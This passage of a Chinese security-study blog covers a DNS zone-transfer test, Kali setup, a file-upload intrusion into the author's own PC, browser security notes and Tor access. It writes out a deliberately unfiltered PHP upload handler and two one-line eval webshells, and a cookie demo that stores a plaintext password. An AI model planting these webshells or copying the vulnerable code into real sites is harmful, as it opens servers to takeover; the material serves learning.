<p>测试版本为BIND 9.8.2rc1-RedHat-9.8.2-0.10.rc1.el6_3.6，默认安装完毕后，配置项没有allow-transfer 项。如果直接使用默认配置文件进行配置的话（不手动添加allow-transfer项），就会存在dns 域传送漏洞。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gA8nU.png" alt="3gA8nU.png"></p>
<p>可以看到此时DNS服务器域传输失败，说明不存在漏洞。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gAcAH.png" alt="3gAcAH.png"></p>
<p>注释掉这一行，开启任意DNS域传送。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gA4jf.png" alt="3gA4jf.png"></p>
<p>此时可以看到服务器所有的子域名。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>DNS域传送漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-19.4汉化以及伪装win10界面</title>
    <url>/2020/02/28/kali-19-4%E6%B1%89%E5%8C%96%E4%BB%A5%E5%8F%8A%E4%BC%AA%E8%A3%85win10%E7%95%8C%E9%9D%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        之前用虚拟机做实验的时候汉化过一次，后来文件被删了(都是自己手贱)，现在又要因为实验要求重新下载一次，但是忘记kali的汉化过程，这次特意记录一下。我用的是kali-2019.4版本，这个版本新上线了一个可以伪装成Windows10的功能，也挺有意思的。</p>
<a id="more"></a>

<h1 id="汉化过程"><a href="#汉化过程" class="headerlink" title="汉化过程"></a>汉化过程</h1><p>​        首先把kali的下载源更改为国内：kali源：</p>
<p>​        <code>vim /etc/apt/source.list</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#官方源</span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ol>
<li><p>更新源和软件</p>
<p><code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</code></p>
</li>
<li><p>选语言</p>
<p><code>dpkg-reconfigure locales</code></p>
<p>进入图形界面，选中en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8（空格是选择，tab是切换，*是选中）并将zh_US.UTF-8选为默认。</p>
</li>
<li><p>安装中文字体</p>
<p><code>apt-get install xfonts-intl-chinese</code></p>
<p><code>apt-get install ttf-wqy-microhei</code></p>
</li>
<li><p>重启kali</p>
<p>重启若还是英文，就继续重启，基本一到两次后就可以了</p>
</li>
</ol>
<h1 id="win10-模式"><a href="#win10-模式" class="headerlink" title="win10 模式"></a>win10 模式</h1><p>终端执行 <code>kali-undercover</code></p>
<p><img src="https://s2.ax1x.com/2020/02/28/3rtbOs.png" alt="3rtbOs.png"></p>
<p>再次输入 <code>kali-undercover</code>即可退出win10模式</p>
<p><img src="https://s2.ax1x.com/2020/02/28/3rNZtK.png" alt="3rNZtK.png"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试实战--家用电脑</title>
    <url>/2020/02/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98-%E5%AE%B6%E7%94%A8%E7%94%B5%E8%84%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        因为疫情的影响导致现在还没有开学，在家里呆的有些无聊，最近也在学习渗透方面的知识，但是关于渗透测试，纸上得来终觉浅，绝知此事要躬行，还是要得累计实战经验，所以我就把目标转向了我家的家用台式电脑，就想把之前学习理解到的简单实现一下。</p>
<a id="more"></a>

<h1 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h1><p>​        家用电脑比较老旧，是在我上初中的时候买的，甚至系统还是<strong>Windows xp</strong>，属于可以进博物馆的古董机，没办法，有靶机已经不错了，无论是虚拟机还是网上的靶场都感觉不得劲，还是物理机有搞头。</p>
<p>​        我开始的时候是想用IIS建站的，但是中间有很多坑，这不算什么，<strong>一杯茶一包烟，一改配置坐一天</strong>，就当我觉得环境搭建成功的时候，我又发现了新的坑，一个是没有php环境，而且IIS支持asp，这也不算什么，但是又发现，开始的时候可以访问的资源莫名其妙的都无权访问了，网页报401，草(一种植物)，在尝试了网上很多方法了之后，我哭了，我放弃了，xp下的IIS服务的权限设置我搞不懂，还是我太弱了，我真是个垃圾(猛男哭泣)。</p>
<p>​        我屈服了，我使用了phpstudy的傻瓜式操作建站，只能说真香，它是如此的便捷，如此的丝滑，我又一次哭了。</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31dxbR.png" alt="31dxbR.png"></p>
<p>还是觉得老版本的phpstudy好用，关于phpstudy的安装和使用就不多说了，直接进入正题。</p>
<p>首先，测试一下，查看一下靶机IP</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31SMLT.png" alt="31SMLT.png"></p>
<p>发现是192.168.0.122</p>
<p>在本机上测试ping一下</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31p9h9.png" alt="31p9h9.png"></p>
<p>可以连上，在浏览器中查看</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31wssJ.png" alt="31wssJ.png"></p>
<p>没问题，环境搭建好了，现在开始测试</p>
<h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>先给靶机配上编辑器，要不用记事本写太变态了。这里我用的notepad++。</p>
<p>这里我准备用上文件上传漏洞来上传一个webshell，用到菜刀连接获取靶机的权限。</p>
<p>所以在靶机中写上一个具有文件上传功能的网页：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31HMF0.png" alt="31HMF0.png"></p>
<p>这里的HTML代码为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>请上传一个文件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload_file.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>php代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"upload:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"type:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"size:"</span>.($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>).<span class="string">"kb&lt;br&gt;"</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"stored in:"</span>.<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从php代码中可以看到没有对上传文件做任何的过滤，当然现实中这种是极少的，只有在靶机中才会出现。</p>
<p>我这里上传了两个php文件，都是一句话木马，只是数据上传方式不同而已，一个是post，一个是get</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33FKKA.png" alt="33FKKA.png"></p>
<p><img src="https://s2.ax1x.com/2020/03/03/3fGQKK.png" alt="3fGQKK.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>@的作用是用来不显示报错的</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31b5U1.png" alt="31b5U1.png"></p>
<p>这个是get类型的一句话木马</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33i9Tf.png" alt="33i9Tf.png"></p>
<p>这个是post类型的一句话木马（图中用的是chrome的hackbar插件）</p>
<p>这样就将一个webshell上传到了服务器了，我们用中国菜刀连接获得权限：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33Ah4K.png" alt="33Ah4K.png"></p>
<p>连接到了就拿取了靶机的shell</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33AXUP.png" alt="33AXUP.png"></p>
<p>我们可以在靶机桌面上新建一个文件，写一句话</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33ZNBd.png" alt="33ZNBd.png"></p>
<p><img src="https://s2.ax1x.com/2020/02/23/33VT0A.png" alt="33VT0A.png"></p>
<p>这样我们可以看到靶机的桌面上就有了一个文本文件，里面就包含了这句话</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33ZI3T.png" alt="33ZI3T.png"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>​        这一次的渗透测试很简单，主要是尝试一些工具的使用和环境的配置以及网站的搭建（有点不成功的），也没有多少难度，最主要的是服务器后端php代码没有严格对上传文件的过滤检查，才是造成文件上传漏洞的成因，这一点是对网站搭建人员要注意和留心的，之后我会尝试写一些过滤方案，以及绕过的方法（因为没有绝对安全的系统）。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器安全</title>
    <url>/2020/02/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><p>​        浏览器的安全策略有很多，比如同源策略，csp，cookie设置，以及浏览器沙箱等，都是游览器安全策略的内容。本文用于记录和理解这些设施，随时扩充，不断学习。</p>
<a id="more"></a>

<h2 id="同源策略-same-origin-policy"><a href="#同源策略-same-origin-policy" class="headerlink" title="同源策略 (same-origin policy)"></a>同源策略 (same-origin policy)</h2><p>​        同源策略是浏览器最核心也最基本的安全功能。</p>
<p>​        内容：在同一个域内，客户端脚本可以任意读写同源内的资源，dom,cookie；但是在不同的域，就不能加载任何资源。即就是不同源的客户端脚本，在没有明确策略，不能访问和修改对方资源。</p>
<p>​        同源：协议，端口，域名三者都相同，称为一个域。</p>
<h2 id="内容安全策略-content-security-policy"><a href="#内容安全策略-content-security-policy" class="headerlink" title="内容安全策略(content-security-policy)"></a>内容安全策略(content-security-policy)</h2><p>​        通过编码在HTTP响应头中的指令来实施策略，用于指定前端网页加载资源的来源。在response中content-security-polity中。(白名单的方式)</p>
<p><code>Content-Security-Polity:script-src &#39;self&#39; https://baidu.com</code></p>
<p>这句的意思是信任来源于百度域名的脚本和当前域名的脚本加载。</p>
<blockquote>
<p><code>default-src</code> : 该指令在某种资源类型指定指令没有被定义的情况下制定了所有资源类型的加载策略(即默认的资源加载策略)</p>
<p><code>script-src</code> : 该指令指定了Web应用程序可以加载的脚本的域或URL</p>
<p><code>object-src</code> : 该指令制定了Web应用程序可以加载的插件，如Falsh</p>
<p><code>style-src</code> : 该指令制定了Web应用程序可以加载的CSS样式表的域或URL</p>
<p><code>img-src</code>: 该指令指定了Web应用程序可以加载的图片的域或URL</p>
<p><code>media-src</code> : 该指令指定了Web应用程序可以加载的音视频的域或URL</p>
<p><code>frame-src</code> : 该指令指定了Web应用程序可以加载的框架的域或URL</p>
<p><code>font-src</code> : 该指令指定了Web应用程序可以加载的字体的域或URL</p>
<p><code>connect-src</code> : 该指令指定了Web应用程序可以加载的像XHR, WebSockets, 以及EventSource等脚本接口的域或URL</p>
<p><code>plugin-types</code> : 该指令指定了哪些MIME类型的插件可以被加载(浏览器支持度不够)</p>
<p><code>form-action</code> : 该指令指定了HTML表单可以提交的URLS(浏览器支持度不够)</p>
<p><code>reflected-xss</code> : 该指令告诉浏览器开启或关闭任何用于过滤或组织反射跨站脚本攻击的启发式算法，这相当于X-XSS-Protection响应头的效果(浏览器支持度不够)</p>
</blockquote>
<p>使用方式：</p>
<ol>
<li>在前端页面<code>&lt;meta&gt;</code>中设置</li>
<li>在服务端设置</li>
</ol>
<h2 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h2><p>​        黑客会在网页中插入一段恶意代码，然后利用浏览器漏洞来执行任意代码，这就叫做 <strong>挂马</strong>。它是浏览器所面对的一种主要的威胁。</p>
<p>​        浏览器为了应对 “挂马” 威胁，从<strong>单进程架构</strong>转变为<strong>多进程架构</strong>。浏览器的多进程架构，会分开浏览器的各个功能模块。这样当一个浏览器进程崩溃时，也不会影响到其他的浏览器进程。这个架构能容许多个程序同时运行而互不影响，每个网页标签都是独立于窗口程序而存在，当资源过高或崩溃时，不会因为一个停顿而整个程序当掉。这样做，可以极大地提升用户体验。</p>
<p>​        沙箱设计的目的是为了让不可信的代码运行在一定的环境中，从而限制这些代码访问<strong>隔离区</strong>之外的资源。如果因为某种原因，确实需要访问隔离区外的资源，那么就必须通过的指定的通道，这些通道会进行严格的安全检查，来判断请求的合法性。通道会采取<strong>默认拒绝</strong>的策略，一般采用封装 API 的方式来实现。</p>
<p>​        Chrome 浏览器包含浏览器进程、渲染进程、插件进程以及扩展进程。插件进程，比如 flash、java 等进程会与浏览器进程严格隔离。</p>
<p>​        Chrome 中的每一个<strong>标签页</strong>都是一个沙箱（sandbox）。为了防止“恶意软件破坏用户系统”或“利用标签页影响其他标签页”。沙箱遵循最小权限原则，每个动作的权限都会被限制，仅能运算而无法写入文件和从敏感区域（即受保护区域）读取文件（如我的文档、桌面）。例如在其中一个标签页运作的恶意软件，将无法窃取信用卡号码、干扰鼠标运作，或告诉系统在启动时运行某个程序，并且恶意软件会在标签页关闭时立即中止。</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>​        cookie是能够让网站服务器把少量文本数据存储到客户端的硬盘，内存，或是从客户端硬盘，内存读取数据的一种技术。</p>
<p>​        因为HTTP协议是无状态的，web服务器无法区分请求是否来源于同一个浏览器。所以，web服务器需要额外的数据用于维持会话。cookie就用来跟随HTTP请求响应一起被额外传递的数据，用来维持会话和标识用户。</p>
<p>​        当你浏览某个网站的时候，该网站或许会向你的电脑写于一个非常小的文件，里面包含cookie信息，当下次浏览这个网站的时候，浏览器从该文件中提取cookie发送给网站，网站读取到cookie信息，得知你的相关信息，做出相应动作，比如：直接登陆，而无需输入用户名密码。</p>
<p>​        cookie按照存储的位置分为两种：内存cookie和硬盘cookie。内存cookie由浏览器维护，保存在内存中，浏览器关闭后就消失，存在时间短，而硬盘cookie保存在硬盘里，存在时期长。</p>
<p>​        一个用户电脑可以具有多个cookie，分别存储不同网站的信息，但是一个网站只能读取该网站本身放置在电脑的cookie，无法得知其他cookie信息。cookie大小最多也只能在4kb左右。</p>
<p>现在我在本地写了一个cs架构的登陆页面</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8nSAHK.png" alt="8nSAHK.png"></p>
<p>这里的勾选记住用户在后端会向客户端写入cookie，而忘记用户则会将cookie删掉，现在我们抓包查看</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8npqoT.png" alt="8npqoT.png"></p>
<p>此时，我们勾选了这个check，而服务器响应头中有了set-cookie字段，并向客户端写入了cookie</p>
<p>如果我们再次登陆，则会有：</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8nSvrt.png" alt="8nSvrt.png"></p>
<p>我们的请求头中有了cookie字段，并且就是刚才服务器给我们客户端写入的两个cookie键值对，而在服务器端，检测到了我们的cookie值，对客户端做出响应，显示我们再次登陆。</p>
<p>我们用忘记用户来删除cookie，实际应用中，应该是退出登陆，</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8npkxs.png" alt="8npkxs.png"></p>
<p>我选择忘记用户选项，我用来删除cookie的方式是重置cookie有效时间是一个过去的时间，那么cookie则会过期并且被删除，此时服务端响应头中正是设置cookie为一个过去时间。</p>
<p>以下为源码：（代码简陋，主要用于抓包分析）</p>
<p>前端：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>用户登陆</span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"cookie.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">id</span>=<span class="string">"user"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            记住用户</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"check"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            忘记用户</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"uncheck"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>后端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;cookie&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        if (isset($_COOKIE[&quot;user&quot;]) &amp; $_COOKIE[&quot;user&quot;] &#x3D;&#x3D; &quot;admin&quot; &amp; $_COOKIE[&quot;password&quot;] &#x3D;&#x3D; &quot;password&quot;) &#123;</span><br><span class="line">            echo &quot;欢迎&quot;.$_COOKIE[&quot;user&quot;].&quot;再次登录！&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif ($_POST[&quot;user&quot;] &#x3D;&#x3D; &quot;admin&quot; &amp; $_POST[&quot;password&quot;] &#x3D;&#x3D; &quot;password&quot;) &#123;</span><br><span class="line">            echo &quot;欢迎&quot;.$_POST[&quot;user&quot;].&quot;！&lt;br&gt;&quot;;</span><br><span class="line">            if (isset($_POST[&quot;check&quot;])) &#123;</span><br><span class="line">                $expire&#x3D;time()+60;</span><br><span class="line">                setcookie(&quot;user&quot;, &quot;admin&quot;, $expire);</span><br><span class="line">                setcookie(&quot;password&quot;, &quot;password&quot;, $expire);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            echo &quot;登陆失败?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($_POST[&quot;uncheck&quot;])) &#123;</span><br><span class="line">            setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">            setcookie(&quot;password&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>同源策略</tag>
        <tag>内容安全策略</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN相关设置-shadowsocksR</title>
    <url>/2020/02/14/VPN%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE-shadowsocksR/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        之前一直用的my2one的服务器代理，pc和移动端也用的ShadowsocksR，也就是SSR，一些设置之前也是用的my2one给的教程，一直没手动设置过，现在想用用TOR游览器，不过开始之前先把VPN设置好，别暴露了自己的IP和位置。</p>
<p>（更新：使用tor游览器访问暗网）</p>
<a id="more"></a>

<h2 id="VPN三种系统代理模式"><a href="#VPN三种系统代理模式" class="headerlink" title="VPN三种系统代理模式"></a>VPN三种系统代理模式</h2><p>​        vpn的系统代理有三种模式，分别是直连模式，全局模式和PAC模式。</p>
<p>​        直连模式，顾名思义就是主机在数据交互时候不使用vpn代理，和没开vpn是一样的，在不使用vpn的场合可以用到直连模式。</p>
<p>​        全局模式，就是将主机所有的数据交互都要经过vpn服务器的代理，也就是主机在通信的时候经过了第三方代理，此时可以隐藏主机的IP地址，当然，也可以绕过GFW。</p>
<p>​        PAC模式，就是主机在连接网站的时候读取PAC文件里面的规则，查看网站是否被墙，如果符合，那就开启VPN服务进行代理，而PAC列表一般从GFWList进行更新。</p>
<h2 id="用SSR-Proxy-SwitchyOmega进行网站代理"><a href="#用SSR-Proxy-SwitchyOmega进行网站代理" class="headerlink" title="用SSR+Proxy SwitchyOmega进行网站代理"></a>用SSR+Proxy SwitchyOmega进行网站代理</h2><p>​        SSR这边我订阅了my2one的服务器，这边代理规则我设置为绕过局域网和大陆，不过我在SSR这边选项设置了端口6666为代理端口，把系统代理设置为直连，这样只会将主机走6666端口的数据进行代理。</p>
<p>​        Proxy SwitchyOmega这边先设置了一个proxy的情景模式，让本地6666端口做代理。</p>
<p>​        然后再设置一个 auto switch 的自动切换模式，导入AutoProxy的格式的规则列表，网址为<a href="https://github.com/gfwlist/gfwlist/raw/master/gfwlist.txt" target="_blank" rel="noopener">https://github.com/gfwlist/gfwlist/raw/master/gfwlist.txt</a></p>
<p>​        按照规则列表匹配请求，让它们过proxy情景模式，剩下的都直接连接。</p>
<h2 id="番外：如何访问暗网"><a href="#番外：如何访问暗网" class="headerlink" title="番外：如何访问暗网"></a>番外：如何访问暗网</h2><p>​         <strong>警告：</strong> 在继续之前，重要的是要了解Dark Web上的许多内容都是非法的。 无论你采取什么预防措施，都不可能保持匿名。 自担风险！</p>
<h3 id="Tor工作原理"><a href="#Tor工作原理" class="headerlink" title="Tor工作原理"></a>Tor工作原理</h3><p>​        Tor由已经安装了Tor软件的电脑连接网络而成。它之所以被称为onion，是因为它的结构就跟洋葱相同，你只能看出它的外表，而想要看到核心，就必须把它层层的剥开。即每个路由器间的传输都经过点对点密钥来加密，形成有层次的结构。它中间所经过的各节点，都好像洋葱的一层皮，把客户端包在里面，算是保护信息来源的一种方式。</p>
<p>​        用 Tor 创建一条私有网络路径时，用户的软件或客户端通过网络上的中继递增地建立一条由若干加密连接组成的环路。环路一次扩展一跳，环路上的中继仅仅知道它从哪一个中继接收数据以及向哪一个中继发送数据。没有一台单独的中继会知道数据包的完整路径。客户端与环路上的每一跳都协商一组独立的密钥，这样可以保证数据通过任何一跳时都无法跟踪。</p>
<ol>
<li><p>下载 tor游览器（如果是在国内，你需要一个梯子），下载地址 <a href="https://www.torproject.org/zh-CN/download/" target="_blank" rel="noopener">https://www.torproject.org/zh-CN/download/</a></p>
</li>
<li><p>安装并配置tor，tor安装有中文，所以很好安装，此处不再赘述。</p>
<p>配置的时候我们知道国内是无法直连的，所以我们要选择configure来配置代理，然后在你的网络提供商是否对Tor网络进行了封锁或审查这里选yes。</p>
<p>然后选择在中国可连的网桥meek-azure。</p>
<p>在高级配置中使用代理访问网络，上面我用到SSR中对本机6666端口进行了代理，所以这里填写了socks 5，地址127.0.0.1和端口6666</p>
</li>
</ol>
<ol start="3">
<li>登陆DuckDuckGo，也就是暗网的Google，查看是否能登陆。（注意，暗网的访问速度一般都很慢。）地址为<a href="https://3g2upl4pq6kufc4m.onion/" target="_blank" rel="noopener">https://3g2upl4pq6kufc4m.onion/</a></li>
</ol>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>VPN</tag>
